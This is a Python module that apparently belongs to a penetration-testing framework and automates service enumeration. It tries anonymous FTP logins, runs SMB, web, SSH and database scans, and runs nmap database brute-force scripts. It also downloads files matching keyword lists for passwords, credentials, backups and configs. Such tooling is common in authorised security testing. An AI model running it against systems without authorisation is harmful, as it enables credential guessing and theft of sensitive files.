"""
Module for performing service enumeration
// מודול לביצוע תשאול שירותים
"""

import os
import re
import json
import time
from rich.console import Console
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TimeElapsedColumn
import ftplib
import requests
import subprocess
import shutil
import socket
from datetime import datetime

from redflow.utils.logger import get_module_logger
from redflow.utils.helpers import run_tool


class Enumeration:
    """Class for performing service enumeration // מחלקה לביצוע תשאול שירותים"""
    
    def __init__(self, config, logger, console):
        """
        Initialize enumeration module
        // אתחול מודול האנומרציה
        
        Args:
            config: Configuration object
            logger: Logger instance
            console: Console instance
        """
        self.config = config
        self.console = console
        self.logger = get_module_logger("Enumeration", logger)
        self.target = config.target
        self.results = {
            "web": {},
            "smb": {},
            "ftp": {},
            "ssh": {},
            "database": {}
        }
    
    def run(self, services):
        """
        Run appropriate service enumeration based on identified services
        // הפעלת תשאול שירותים מתאים בהתאם לשירותים שזוהו
        
        Args:
            services: List of identified services
            
        Returns:
            Enumeration results
        """
        self.logger.info(f"Starting service enumeration for {self.target}")
        
        # Create progress display
        with Progress(
            SpinnerColumn(),
            TextColumn("[bold blue]{task.description}"),
            BarColumn(),
            TimeElapsedColumn(),
            console=self.console
        ) as progress:
            # Perform enumeration according to identified service types
            service_types = self._group_services_by_type(services)
            
            # FTP enumeration
            if "ftp" in service_types:
                ftp_task = progress.add_task("[cyan]Performing FTP enumeration...", total=1)
                self._enumerate_ftp(service_types["ftp"])
                progress.update(ftp_task, completed=1)
            
            # SMB/Windows enumeration
            if "smb" in service_types or "microsoft-ds" in service_types:
                smb_task = progress.add_task("[cyan]Performing SMB/Windows enumeration...", total=1)
                smb_services = service_types.get("smb", []) + service_types.get("microsoft-ds", [])
                self._enumerate_smb(smb_services)
                progress.update(smb_task, completed=1)
            
            # Web service enumeration
            if "http" in service_types or "https" in service_types:
                web_task = progress.add_task("[cyan]Performing Web service enumeration...", total=1)
                web_services = service_types.get("http", []) + service_types.get("https", [])
                self._enumerate_web(web_services)
                progress.update(web_task, completed=1)
            
            # SSH enumeration
            if "ssh" in service_types:
                ssh_task = progress.add_task("[cyan]Performing SSH enumeration...", total=1)
                self._enumerate_ssh(service_types["ssh"])
                progress.update(ssh_task, completed=1)
            
            # Database enumeration
            db_services = []
            for db_type in ["mysql", "postgresql", "mssql", "oracle"]:
                if db_type in service_types:
                    db_services.extend(service_types[db_type])
            
            if db_services:
                db_task = progress.add_task("[cyan]Performing database enumeration...", total=1)
                self._enumerate_databases(db_services)
                progress.update(db_task, completed=1)
        
        # After all enumerations are completed
        self._show_results_summary()
        
        return self.results
    
    def _group_services_by_type(self, services):
        """
        Group services by their type
        // קיבוץ שירותים לפי סוג
        
        Args:
            services: List of identified services
            
        Returns:
            Dictionary of service types with lists of services
        """
        service_types = {}
        
        for service in services:
            service_name = service["name"].lower()
            
            if service_name not in service_types:
                service_types[service_name] = []
            
            service_types[service_name].append(service)
        
        # Log found service types
        if service_types:
            self.logger.info(f"Service types identified: {', '.join(service_types.keys())}")
        
        return service_types
    
    def _enumerate_ftp(self, ftp_services):
        """
        Perform FTP service enumeration
        // ביצוע תשאול שירותי FTP
        
        Args:
            ftp_services: List of FTP services
        """
        self.logger.info(f"Performing FTP enumeration for {self.target}")
        
        # Check if we have FTP services
        if not ftp_services or len(ftp_services) == 0:
            self.logger.warning("No FTP services found to enumerate")
            return
        
        # We need to handle each FTP service individually
        for ftp_service in ftp_services:
            # Handle both string and dictionary service representations
            if isinstance(ftp_service, dict):
                port = ftp_service.get("port", "21")
                version = ftp_service.get("version", "")
                
                # Call the standalone FTP enumeration method
                ftp_info = self._enumerate_single_ftp(
                    host=str(self.target),  # Ensure host is a string
                    port=port,
                    service_info=ftp_service
                )
                
                # Save results
                self.results["ftp"] = ftp_info
            else:
                self.logger.warning(f"Unexpected FTP service format: {ftp_service}")

    def _enumerate_single_ftp(self, host, port=21, service_info=None):
        """
        Enumerate an FTP server
        
        Args:
            host (str): Target host
            port (int or str): Target port
            service_info (dict, optional): Service info from Nmap
            
        Returns:
            dict: FTP enumeration results
        """
        # Ensure host is a string
        host = str(host)
        
        # Ensure port is a string for logging and an integer for connecting
        port_str = str(port)
        try:
            port_int = int(port)
        except (ValueError, TypeError):
            self.logger.error(f"Invalid port number for FTP enumeration: {port}")
            port_int = 21
        
        ftp_info = {
            "port": port_str,
            "name": "ftp",
            "anonymous_access": False,
            "directories": [],
            "files": [],
            "downloaded_files": []
        }
        
        # Add service version if available
        if service_info and "version" in service_info:
            ftp_info["version"] = service_info["version"]
        
        try:
            # Try anonymous login
            self.logger.info(f"Attempting anonymous FTP login to {host}:{port_str}")
            ftp = ftplib.FTP()
            ftp.connect(host, port_int)  # host is guaranteed to be a string
            ftp.login("anonymous", "anonymous@example.com")
            
            # If we got here, anonymous login succeeded
            ftp_info["anonymous_access"] = True
            self.logger.warning(f"Anonymous FTP access allowed on {host}:{port_str}")
            
            # List root directory
            self._list_ftp_directory(ftp, "/", ftp_info)
            
            # Download interesting files if found and downloader is available
            if hasattr(self, 'downloader') and self.downloader:
                self._download_interesting_ftp_files(host, port_str, ftp_info)
            
            ftp.quit()
            
        except ftplib.all_errors as e:
            self.logger.info(f"FTP enumeration error for {host}:{port_str}: {str(e)}")
        except Exception as e:
            self.logger.error(f"Unexpected error in FTP enumeration for {host}:{port_str}: {str(e)}")
        
        return ftp_info
    
    def _list_ftp_directory(self, ftp, directory, ftp_info, max_depth=2, current_depth=0):
        """
        Recursively list FTP directories
        
        Args:
            ftp (ftplib.FTP): FTP connection
            directory (str): Current directory to list
            ftp_info (dict): FTP information dictionary to update
            max_depth (int): Maximum recursion depth
            current_depth (int): Current recursion depth
        """
        if current_depth > max_depth:
            return
            
        try:
            original_dir = ftp.pwd()
            
            # Try to change to directory
            ftp.cwd(directory)
            current_dir = ftp.pwd()
            
            # Add directory to list if not already there
            if current_dir not in ftp_info["directories"]:
                ftp_info["directories"].append(current_dir)
            
            # List files and directories
            file_list = []
            ftp.retrlines('LIST', file_list.append)
            
            for item in file_list:
                parts = item.split()
                if len(parts) < 9:
                    continue
                    
                # Check if it's a directory
                is_dir = parts[0].startswith('d')
                filename = " ".join(parts[8:])
                
                if is_dir and current_depth < max_depth:
                    # Recursively list subdirectory
                    new_dir = f"{current_dir}/{filename}" if current_dir != "/" else f"/{filename}"
                    self._list_ftp_directory(ftp, new_dir, ftp_info, max_depth, current_depth + 1)
                else:
                    # It's a file, add to file list
                    file_path = f"{current_dir}/{filename}" if current_dir != "/" else f"/{filename}"
                    ftp_info["files"].append(file_path)
            
            # Return to original directory
            ftp.cwd(original_dir)
            
        except ftplib.all_errors as e:
            self.logger.debug(f"Error listing FTP directory {directory}: {str(e)}")

    def _download_interesting_ftp_files(self, host, port, ftp_info):
        """
        Download interesting files from FTP server
        
        Args:
            host (str): FTP server host
            port (int): FTP server port
            ftp_info (dict): FTP information dictionary to update
        """
        # Create a specific directory for FTP downloads
        target_dir = self.downloader.create_directory_for_downloads("ftp", port)
        
        # Define interesting file patterns
        interesting_extensions = [
            ".txt", ".pdf", ".doc", ".docx", ".xls", ".xlsx", 
            ".conf", ".config", ".ini", ".log", ".bak", ".backup",
            ".sql", ".db", ".php", ".asp", ".aspx", ".jsp", ".cgi"
        ]
        
        interesting_filenames = [
            "passwd", "password", "credentials", "users", "admin",
            "config", "settings", "database", "backup", "README"
        ]
        
        # Check each file
        for file_path in ftp_info["files"]:
            filename = os.path.basename(file_path)
            extension = os.path.splitext(filename)[1].lower()
            
            # Check if file matches our criteria
            is_interesting = False
            
            if extension in interesting_extensions:
                is_interesting = True
                
            for pattern in interesting_filenames:
                if pattern.lower() in filename.lower():
                    is_interesting = True
                    break
                    
            if is_interesting:
                # Try to download the file
                try:
                    self.logger.info(f"Downloading interesting FTP file: {file_path}")
                    
                    # Try anonymous login first
                    result = self.downloader.download_ftp_file(
                        host=host,
                        remote_path=file_path,
                        target_dir=target_dir
                    )
                    
                    if result:
                        ftp_info["downloaded_files"].append({
                            "remote_path": file_path,
                            "local_path": result
                        })
                        
                except Exception as e:
                    self.logger.error(f"Error downloading FTP file {file_path}: {str(e)}")

    def _enumerate_smb(self, smb_services):
        """
        Perform SMB/Windows enumeration
        // ביצוע תשאול שירותי SMB/Windows
        
        Args:
            smb_services: List of SMB services
        """
        self.logger.info(f"Performing SMB/Windows enumeration for {self.target}")
        
        smb_results = {
            "version": "",
            "os": "",
            "computer_name": "",
            "domain": "",
            "shares": [],
            "users": [],
            "sessions": [],
            "port": smb_services[0]["port"] if smb_services else 445
        }
        
        for smb_service in smb_services:
            port = smb_service["port"]
            version = smb_service.get("version", "")
            smb_results["version"] = version
            
            # Run enum4linux
            output_file = self.config.get_output_file("enum4linux", "txt")
            
            cmd = ["enum4linux", "-a", self.target]
            
            result = run_tool(cmd, output_file=output_file)
            
            if result["returncode"] == 0:
                self.logger.debug(f"enum4linux results saved in: {output_file}")
                
                # Analyze the results
                stdout = result["stdout"]
                
                # Extract hostname
                hostname_match = re.search(r"NetBIOS computer name:\s*(\S+)", stdout)
                if hostname_match:
                    smb_results["computer_name"] = hostname_match.group(1)
                
                # Extract domain
                domain_match = re.search(r"Workgroup\s*/\s*Domain:\s*(\S+)", stdout)
                if domain_match:
                    smb_results["domain"] = domain_match.group(1)
                
                # Extract operating system
                os_match = re.search(r"OS:\s*(.+)", stdout)
                if os_match:
                    smb_results["os"] = os_match.group(1).strip()
                
                # Extract shares
                shares = []
                for line in stdout.splitlines():
                    share_match = re.search(r"Mapping: OK, Listing: OK\s*(\S+)", line)
                    if share_match:
                        shares.append(share_match.group(1))
                smb_results["shares"] = shares
                
                # Extract users
                users = []
                for line in stdout.splitlines():
                    user_match = re.search(r"user:\[(\S+)\]", line)
                    if user_match:
                        users.append(user_match.group(1))
                smb_results["users"] = users
            
            # Run SMB scripts
            nmap_output = self.config.get_output_file("nmap_smb", "txt")
            
            cmd = ["nmap", "--script", "smb-os-discovery,smb-enum-shares,smb-enum-users", "-p", str(port), self.target, "-oN", nmap_output]
            
            result = run_tool(cmd)
            
            if result["returncode"] == 0:
                self.logger.debug(f"nmap SMB scripts results saved in: {nmap_output}")
        
        self.results["smb"] = smb_results
    
    def _enumerate_web(self, web_services):
        """
        Perform Web service enumeration
        // ביצוע תשאול שירותי Web
        
        Args:
            web_services: List of Web services
        """
        self.logger.info(f"Performing Web enumeration for {self.target}")
        
        web_results = []
        
        for web_service in web_services:
            port = web_service["port"]
            is_https = web_service["name"].lower() == "https"
            protocol = "https" if is_https else "http"
            
            web_info = {
                "port": port,
                "protocol": protocol,
                "directories": [],
                "files": [],
                "tech": [],
                "vhosts": [],
                "downloaded_files": []  # Track downloaded files
            }
            
            # Run gobuster to discover hidden directories and pages
            output_file = self.config.get_output_file(f"gobuster_{port}", "txt")
            
            # Create URL
            target_url = f"{protocol}://{self.target}:{port}/"
            
            # Select wordlist
            wordlist = self.config.wordlist_paths.get("dirb_common")
            if not os.path.exists(wordlist):
                # If wordlist not found, try to find another one
                for key, wl_path in self.config.wordlist_paths.items():
                    if os.path.exists(wl_path) and "dir" in key:
                        wordlist = wl_path
                        break
            
            if not wordlist or not os.path.exists(wordlist):
                self.logger.warning("No suitable wordlist found for gobuster, skipping")
                continue
            
            # Run gobuster
            self.logger.info(f"Running gobuster against {target_url}")
            cmd = [
                "gobuster", "dir",
                "-u", target_url,
                "-w", wordlist,
                "-o", output_file,
                "-t", str(self.config.tool_settings["gobuster"]["threads"])
            ]
            
            # If HTTPS, add parameter to skip SSL verification
            if is_https:
                cmd.extend(["-k"])
            
            result = run_tool(cmd, timeout=600)  # Longer runtime
            
            if result["returncode"] == 0:
                self.logger.debug(f"Gobuster results saved in: {output_file}")
                
                # Parse results
                if os.path.exists(output_file):
                    with open(output_file, "r", encoding="utf-8") as f:
                        lines = f.readlines()
                        
                        for line in lines:
                            if line.startswith("/"):
                                path = line.split()[0].strip()
                                if path.endswith("/"):
                                    web_info["directories"].append(path)
                                else:
                                    web_info["files"].append(path)
                                    
                    self.logger.info(f"Found {len(web_info['directories'])} directories and {len(web_info['files'])} files")
            
            # Run nikto for vulnerability scanning
            nikto_output = self.config.get_output_file(f"nikto_{port}", "txt")
            
            self.logger.info(f"Running nikto vulnerability scan against {target_url}")
            cmd = ["nikto", "-h", target_url, "-o", nikto_output]
            
            # If HTTPS, add parameter to skip SSL verification
            if is_https:
                cmd.extend(["-ssl"])
            
            result = run_tool(cmd, timeout=600)
            
            if result["returncode"] == 0:
                self.logger.debug(f"Nikto results saved in: {nikto_output}")
                # Parse nikto results to find additional files or vulnerabilities
                if os.path.exists(nikto_output):
                    with open(nikto_output, "r", encoding="utf-8", errors="ignore") as f:
                        lines = f.readlines()
                        for line in lines:
                            # Extract file paths from nikto output
                            if "OSVDB" in line and ":" in line:
                                parts = line.split(":", 2)
                                if len(parts) > 2:
                                    message = parts[2].strip()
                                    # Extract paths found
                                    path_match = re.search(r'/([\w\-\.\/]+)', message)
                                    if path_match and path_match.group(0) not in web_info["files"]:
                                        web_info["files"].append(path_match.group(0))
            
            # Try to check for robots.txt and sitemap.xml
            common_files = ["robots.txt", "sitemap.xml", ".htaccess", "crossdomain.xml"]
            for file in common_files:
                file_url = f"{target_url}{file}"
                try:
                    resp = requests.get(file_url, verify=False, timeout=5)
                    if resp.status_code == 200:
                        file_path = f"/{file}"
                        if file_path not in web_info["files"]:
                            self.logger.info(f"Found common file: {file_path}")
                            web_info["files"].append(file_path)
                            
                            # Parse robots.txt for additional paths
                            if file == "robots.txt":
                                for line in resp.text.splitlines():
                                    if "Disallow:" in line:
                                        path = line.split("Disallow:", 1)[1].strip()
                                        if path and path not in web_info["files"] and path not in web_info["directories"]:
                                            if path.endswith("/"):
                                                web_info["directories"].append(path)
                                            else:
                                                web_info["files"].append(path)
                except:
                    pass
                
            # Check for interesting files in root directory
            interesting_paths = [
                "/backup", "/admin", "/login", "/config", "/dashboard", 
                "/wp-admin", "/wp-login.php", "/wp-config.php", "/config.php",
                "/administrator", "/phpmyadmin", "/secret"
            ]
            
            for path in interesting_paths:
                path_url = f"{target_url.rstrip('/')}{path}"
                try:
                    resp = requests.get(path_url, verify=False, timeout=5)
                    if resp.status_code != 404:
                        if path.endswith("/") or "." not in path:
                            if path not in web_info["directories"]:
                                self.logger.info(f"Found interesting directory: {path}")
                                web_info["directories"].append(path)
                        else:
                            if path not in web_info["files"]:
                                self.logger.info(f"Found interesting file: {path}")
                                web_info["files"].append(path)
                except:
                    pass
            
            # Initialize downloader and download interesting files if available
            if hasattr(self, 'downloader') and self.downloader:
                # Download interesting files found
                self._download_interesting_web_files(self.target, port, web_info)
                
            # Add this result to the list of web results
            web_results.append(web_info)
        
        self.results["web"] = web_results
        
        # Display information about downloaded files
        for web_result in web_results:
            downloaded = web_result.get("downloaded_files", [])
            if downloaded:
                port = web_result.get("port")
                protocol = web_result.get("protocol")
                self.logger.info(f"Downloaded {len(downloaded)} files from {protocol}://{self.target}:{port}")
                for dl_file in downloaded:
                    url = dl_file.get("url", "unknown")
                    local_path = dl_file.get("local_path", "unknown")
                    self.logger.info(f"  - {os.path.basename(local_path)} from {url}")
                    
                self.console.print(f"[green]Downloaded {len(downloaded)} files from {protocol}://{self.target}:{port}[/green]")
                self.console.print(f"Files saved in: {os.path.dirname(downloaded[0]['local_path'])}")
    
    def _download_interesting_web_files(self, host, port, web_info):
        """
        Download interesting files found during web enumeration
        
        Args:
            host (str): Web server host
            port (int): Web server port
            web_info (dict): Web information dictionary to update
        """
        # Create a specific directory for web downloads
        target_dir = self.downloader.create_directory_for_downloads(web_info["protocol"], port)
        
        # Define interesting file extensions to download
        interesting_extensions = [
            ".txt", ".pdf", ".doc", ".docx", ".xls", ".xlsx", 
            ".conf", ".config", ".ini", ".log", ".bak", ".backup",
            ".sql", ".db", ".xml", ".json", ".php", ".asp", ".jsp",
            ".zip", ".tar", ".gz", ".rar"
        ]
        
        protocol = web_info["protocol"]
        base_url = f"{protocol}://{host}:{port}"
        
        # Check each file
        for file_path in web_info["files"]:
            # Ensure path starts with /
            if not file_path.startswith("/"):
                file_path = "/" + file_path
                
            file_url = f"{base_url}{file_path}"
            filename = os.path.basename(file_path)
            extension = os.path.splitext(filename)[1].lower()
            
            # Only download files with interesting extensions or interesting names
            interesting_keywords = ["password", "admin", "user", "config", "backup", "secret", "key", "db"]
            
            if extension in interesting_extensions or any(keyword in filename.lower() for keyword in interesting_keywords):
                try:
                    self.logger.info(f"Downloading interesting web file: {file_url}")
                    
                    # Download the file
                    result = self.downloader.download_http_file(
                        url=file_url,
                        target_dir=target_dir,
                        verify=False
                    )
                    
                    if result:
                        web_info["downloaded_files"].append({
                            "url": file_url,
                            "local_path": result
                        })
                        
                except Exception as e:
                    self.logger.error(f"Error downloading web file {file_url}: {str(e)}")
                    
        # If we have found directories, also try to find index files inside them
        for dir_path in web_info["directories"]:
            # Ensure path starts with / and ends with /
            if not dir_path.startswith("/"):
                dir_path = "/" + dir_path
            if not dir_path.endswith("/"):
                dir_path = dir_path + "/"
                
            # Try common index files
            index_files = ["index.html", "index.php", "default.asp", "index.jsp", "default.html"]
            for index_file in index_files:
                file_url = f"{base_url}{dir_path}{index_file}"
                try:
                    resp = requests.head(file_url, verify=False, timeout=5)
                    if resp.status_code == 200:
                        self.logger.info(f"Found index file: {dir_path}{index_file}")
                        # Don't need to download index files specifically
                        break
                except:
                    pass
    
    def _enumerate_ssh(self, ssh_services):
        """
        Perform SSH service enumeration
        // ביצוע תשאול שירותי SSH
        
        Args:
            ssh_services: List of SSH services
        """
        self.logger.info(f"Performing SSH enumeration for {self.target}")
        
        ssh_results = {
            "version": "",
            "auth_methods": [],
            "algorithms": [],
            "weak_algorithms": False,
            "port": ssh_services[0]["port"] if ssh_services else 22
        }
        
        for ssh_service in ssh_services:
            port = ssh_service["port"]
            version = ssh_service.get("version", "")
            ssh_results["version"] = version
            
            # Check authentication methods and weaknesses
            output_file = self.config.get_output_file(f"ssh_audit_{port}", "txt")
            
            cmd = ["nmap", "--script", "ssh-auth-methods,ssh2-enum-algos", "-p", str(port), self.target, "-oN", output_file]
            
            result = run_tool(cmd)
            
            if result["returncode"] == 0:
                self.logger.debug(f"SSH audit results saved in: {output_file}")
                
                # Parse results
                stdout = result["stdout"]
                
                # Extract authentication methods
                for line in stdout.splitlines():
                    if "ssh-auth-methods" in line and "publickey" in line:
                        methods = re.findall(r"(\w+)", line)
                        ssh_results["auth_methods"] = [m for m in methods if m in ["password", "publickey", "keyboard-interactive"]]
                
                # Extract algorithms
                algos = []
                for line in stdout.splitlines():
                    if "ssh2-enum-algos" in line and "encryption_algorithms" in line:
                        algo_match = re.search(r"encryption_algorithms:(.+)", line)
                        if algo_match:
                            algo_str = algo_match.group(1).strip()
                            algos = [a.strip() for a in algo_str.split(",")]
                            ssh_results["algorithms"] = algos
                
                # Check for weak algorithms
                weak_algos = ["arcfour", "blowfish", "3des", "des"]
                for algo in ssh_results.get("algorithms", []):
                    if any(weak in algo.lower() for weak in weak_algos):
                        ssh_results["weak_algorithms"] = True
                        break
        
        self.results["ssh"] = ssh_results
    
    def _enumerate_databases(self, db_services):
        """
        Perform database enumeration
        // ביצוע תשאול מסדי נתונים
        
        Args:
            db_services: List of database services
        """
        self.logger.info(f"Performing database enumeration for {self.target}")
        
        db_results = {}
        
        for db_service in db_services:
            port = db_service["port"]
            service_name = db_service.get("name", "").lower() if "name" in db_service else "" 
            version = db_service.get("version", "")
            
            if not service_name:
                if port == "3306":
                    service_name = "mysql"
                elif port == "5432":
                    service_name = "postgresql"
                elif port == "1433":
                    service_name = "mssql"
                elif port == "1521":
                    service_name = "oracle"
                else:
                    self.logger.warning(f"Unknown database service on port {port}, skipping")
                    continue
            
            db_info = {
                "port": port,
                "type": service_name,
                "version": version,
                "default_credentials": False,
                "accessible": False
            }
            
            # Run nmap scripts specific to database type
            nmap_script = ""
            
            if "mysql" in service_name:
                nmap_script = "mysql-info,mysql-empty-password,mysql-enum,mysql-brute"
            elif "postgresql" in service_name or "postgres" in service_name:
                nmap_script = "pgsql-info,pgsql-brute"
            elif "mssql" in service_name:
                nmap_script = "ms-sql-info,ms-sql-empty-password,ms-sql-brute"
            elif "oracle" in service_name:
                nmap_script = "oracle-brute,oracle-enum-users"
            
            if nmap_script:
                output_file = self.config.get_output_file(f"db_{service_name}_{port}", "txt")
                
                cmd = ["nmap", "--script", nmap_script, "-p", str(port), self.target, "-oN", output_file]
                
                result = run_tool(cmd)
                
                if result["returncode"] == 0:
                    self.logger.debug(f"Database {service_name} results saved in: {output_file}")
                    
                    # Parse results
                    stdout = result["stdout"]
                    
                    # Check for access
                    if "success" in stdout.lower() or "identified" in stdout.lower():
                        db_info["accessible"] = True
                    
                    # Check for empty or default credentials
                    if "empty-password" in stdout.lower() or "default.credentials" in stdout.lower():
                        db_info["default_credentials"] = True
            
            # Add only if we found information about the database
            if db_info["type"] not in db_results:
                db_results[db_info["type"]] = []
            
            db_results[db_info["type"]].append(db_info)
        
        self.results["database"] = db_results
    
    def _show_results_summary(self):
        """
        Display summary of enumeration results
        // הצגת סיכום תוצאות התשאול
        """
        self.logger.info("Displaying enumeration results summary")
        
        self.console.print("\n[bold green]Service Enumeration Summary:[/bold green]")
        
        # FTP summary
        if self.results["ftp"]:
            ftp_info = self.results["ftp"]
            anon_access = "Yes" if ftp_info.get("anonymous_access", False) else "No"
            dirs_count = len(ftp_info.get("directories", []))
            
            self.console.print(f"[cyan]FTP (Port {ftp_info.get('port')}):[/cyan]")
            self.console.print(f"  Anonymous access: {anon_access}")
            self.console.print(f"  Directories found: {dirs_count}")
        
        # SMB summary
        if self.results["smb"]:
            smb_info = self.results["smb"]
            shares_count = len(smb_info.get("shares", []))
            users_count = len(smb_info.get("users", []))
            
            self.console.print(f"[cyan]SMB (Port {smb_info.get('port')}):[/cyan]")
            self.console.print(f"  Computer name: {smb_info.get('computer_name', 'Unknown')}")
            self.console.print(f"  Domain: {smb_info.get('domain', 'Unknown')}")
            self.console.print(f"  Operating System: {smb_info.get('os', 'Unknown')}")
            self.console.print(f"  Shares found: {shares_count}")
            self.console.print(f"  Users found: {users_count}")
        
        # Web summary
        if self.results["web"]:
            for web_info in self.results["web"]:
                protocol = web_info.get("protocol", "http")
                port = web_info.get("port")
                dirs_count = len(web_info.get("directories", []))
                files_count = len(web_info.get("files", []))
                
                self.console.print(f"[cyan]Web ({protocol} on port {port}):[/cyan]")
                self.console.print(f"  Directories found: {dirs_count}")
                self.console.print(f"  Files found: {files_count}")
        
        # SSH summary
        if self.results["ssh"]:
            ssh_info = self.results["ssh"]
            auth_methods = ", ".join(ssh_info.get("auth_methods", ["Unknown"]))
            weak_algos = "Yes" if ssh_info.get("weak_algorithms", False) else "No"
            
            self.console.print(f"[cyan]SSH (Port {ssh_info.get('port')}):[/cyan]")
            self.console.print(f"  Version: {ssh_info.get('version', 'Unknown')}")
            self.console.print(f"  Authentication methods: {auth_methods}")
            self.console.print(f"  Weak algorithms: {weak_algos}")
        
        # Database summary
        if self.results["database"]:
            for db_type, db_instances in self.results["database"].items():
                for db in db_instances:
                    port = db.get("port")
                    accessible = "Yes" if db.get("accessible", False) else "No"
                    default_creds = "Yes" if db.get("default_credentials", False) else "No"
                    
                    self.console.print(f"[cyan]Database {db_type} (Port {port}):[/cyan]")
                    self.console.print(f"  Version: {db.get('version', 'Unknown')}")
                    self.console.print(f"  Accessible: {accessible}")
                    self.console.print(f"  Default credentials: {default_creds}")
        
        self.console.print("")  # Extra space 

    def enumerate_services(self, target, services, output_dir):
        """
        Enumerate discovered services
        
        Args:
            target (str): Target to scan
            services (list): List of services to enumerate
            output_dir (str): Output directory for results
            
        Returns:
            dict: Enumeration results
        """
        self.logger.info(f"Starting service enumeration for {target}")
        self.target = target  # Ensure target is set
        
        # Initialize downloader if not present
        if not hasattr(self, 'downloader'):
            from redflow.utils.downloader import FileDownloader
            self.downloader = FileDownloader(output_dir, self.logger, self.console)
        
        enumeration_results = {}
        service_types = self._group_services_by_type(services)
        
        # Log what we're enumerating
        for service_type, instances in service_types.items():
            self.logger.info(f"Will enumerate {len(instances)} {service_type} service(s)")
        
        # Create progress display
        with Progress(
            SpinnerColumn(),
            TextColumn("[bold blue]{task.description}"),
            BarColumn(),
            TimeElapsedColumn(),
            console=self.console
        ) as progress:
            # FTP enumeration
            if "ftp" in service_types:
                ftp_task = progress.add_task("[cyan]Performing FTP enumeration...", total=1)
                self._enumerate_ftp(service_types["ftp"])
                progress.update(ftp_task, completed=1)
            
            # SMB/Windows enumeration
            if "smb" in service_types or "microsoft-ds" in service_types:
                smb_task = progress.add_task("[cyan]Performing SMB/Windows enumeration...", total=1)
                smb_services = service_types.get("smb", []) + service_types.get("microsoft-ds", [])
                self._enumerate_smb(smb_services)
                progress.update(smb_task, completed=1)
            
            # Web service enumeration
            if "http" in service_types or "https" in service_types:
                web_task = progress.add_task("[cyan]Performing Web service enumeration...", total=1)
                web_services = service_types.get("http", []) + service_types.get("https", [])
                self._enumerate_web(web_services)
                progress.update(web_task, completed=1)
            
            # SSH enumeration
            if "ssh" in service_types:
                ssh_task = progress.add_task("[cyan]Performing SSH enumeration...", total=1)
                self._enumerate_ssh(service_types["ssh"])
                progress.update(ssh_task, completed=1)
            
            # Database enumeration
            db_services = []
            for db_type in ["mysql", "postgresql", "mssql", "oracle"]:
                if db_type in service_types:
                    db_services.extend(service_types[db_type])
            
            if db_services:
                db_task = progress.add_task("[cyan]Performing database enumeration...", total=1)
                self._enumerate_databases(db_services)
                progress.update(db_task, completed=1)
        
        # After all enumerations are completed
        self._show_results_summary()
        
        return self.results 

    def list_discovered_files(self, target=None, port=80, protocol="http"):
        """
        List all discovered files for a specific web service
        
        Args:
            target (str, optional): Target host (if different from current target)
            port (int or str): Port of the web service
            protocol (str): Protocol (http or https)
            
        Returns:
            dict: Dictionary with discovered files information
        """
        if target is None:
            target = self.target

        port_str = str(port)
        
        # Find the web service results for the specified port
        web_files = []
        web_dirs = []
        downloaded_files = []
        
        if isinstance(self.results["web"], list):
            for web_service in self.results["web"]:
                if str(web_service.get("port", "")) == port_str and web_service.get("protocol", "") == protocol:
                    web_files = web_service.get("files", [])
                    web_dirs = web_service.get("directories", [])
                    downloaded_files = web_service.get("downloaded_files", [])
                    break
        
        result = {
            "target": target,
            "port": port_str,
            "protocol": protocol,
            "url": f"{protocol}://{target}:{port_str}",
            "files": web_files,
            "directories": web_dirs,
            "downloaded_files": downloaded_files
        }
        
        # Display summary to console
        self.console.print(f"\n[bold cyan]Files discovered on {protocol}://{target}:{port_str}[/bold cyan]")
        
        if web_files:
            self.console.print(f"\n[bold green]Files ({len(web_files)}):[/bold green]")
            for file in web_files:
                self.console.print(f"  {file}")
        else:
            self.console.print("[yellow]No files discovered[/yellow]")
            
        if web_dirs:
            self.console.print(f"\n[bold green]Directories ({len(web_dirs)}):[/bold green]")
            for directory in web_dirs:
                self.console.print(f"  {directory}")
        else:
            self.console.print("[yellow]No directories discovered[/yellow]")
            
        if downloaded_files:
            self.console.print(f"\n[bold green]Downloaded Files ({len(downloaded_files)}):[/bold green]")
            for df in downloaded_files:
                url = df.get("url", "Unknown URL")
                path = df.get("local_path", "Unknown path")
                filename = os.path.basename(path)
                self.console.print(f"  {filename} - [blue]{url}[/blue] - [yellow]{path}[/yellow]")
        else:
            self.console.print("[yellow]No files have been downloaded yet[/yellow]")
            
        return result
        
    def download_file(self, url, target_dir=None):
        """
        Download a specific file from a URL
        
        Args:
            url (str): Full URL to the file
            target_dir (str, optional): Directory to save the file
            
        Returns:
            str: Path to the downloaded file or None if download failed
        """
        if not hasattr(self, 'downloader'):
            from redflow.utils.downloader import FileDownloader
            self.downloader = FileDownloader(self.config.output_dir, self.logger, self.console)
            
        # Parse URL to determine protocol
        if url.startswith("http://") or url.startswith("https://"):
            protocol = "http"
            url_to_download = url
            
            # Extract host and port from URL if needed
            host = None
            port = None
            
            self.console.print(f"[bold]Downloading file from [blue]{url}[/blue]...[/bold]")
            
            result = self.downloader.download_http_file(
                url=url_to_download,
                target_dir=target_dir,
                verify=False
            )
            
            if result:
                self.console.print(f"[green]File downloaded successfully to:[/green] {result}")
                return result
            else:
                self.console.print("[red]Failed to download file[/red]")
                return None
        elif url.startswith("ftp://"):
            protocol = "ftp"
            # Handle FTP URLs
            from urllib.parse import urlparse
            parsed_url = urlparse(url)
            host = parsed_url.netloc
            path = parsed_url.path
            
            self.console.print(f"[bold]Downloading file from [blue]{url}[/blue]...[/bold]")
            
            result = self.downloader.download_ftp_file(
                host=host,
                remote_path=path,
                target_dir=target_dir
            )
            
            if result:
                self.console.print(f"[green]File downloaded successfully to:[/green] {result}")
                return result
            else:
                self.console.print("[red]Failed to download file[/red]")
                return None
        else:
            # Assume it's a simple path on an HTTP server
            protocol = "http"
            if not url.startswith("/"):
                url = "/" + url
                
            # Try to determine target and port from current results
            if self.target and "web" in self.results:
                web_results = self.results["web"]
                if isinstance(web_results, list) and len(web_results) > 0:
                    # Default to first web service found
                    web_service = web_results[0]
                    target = self.target
                    port = web_service.get("port", 80)
                    protocol = web_service.get("protocol", "http")
                    
                    full_url = f"{protocol}://{target}:{port}{url}"
                    
                    self.console.print(f"[bold]Downloading file from [blue]{full_url}[/blue]...[/bold]")
                    
                    result = self.downloader.download_http_file(
                        url=full_url,
                        target_dir=target_dir,
                        verify=False
                    )
                    
                    if result:
                        self.console.print(f"[green]File downloaded successfully to:[/green] {result}")
                        return result
                    else:
                        self.console.print("[red]Failed to download file[/red]")
                        return None
                else:
                    self.console.print("[red]Cannot determine web server details for download[/red]")
                    return None
            else:
                self.console.print("[red]Cannot determine web server details for download[/red]")
                return None
    
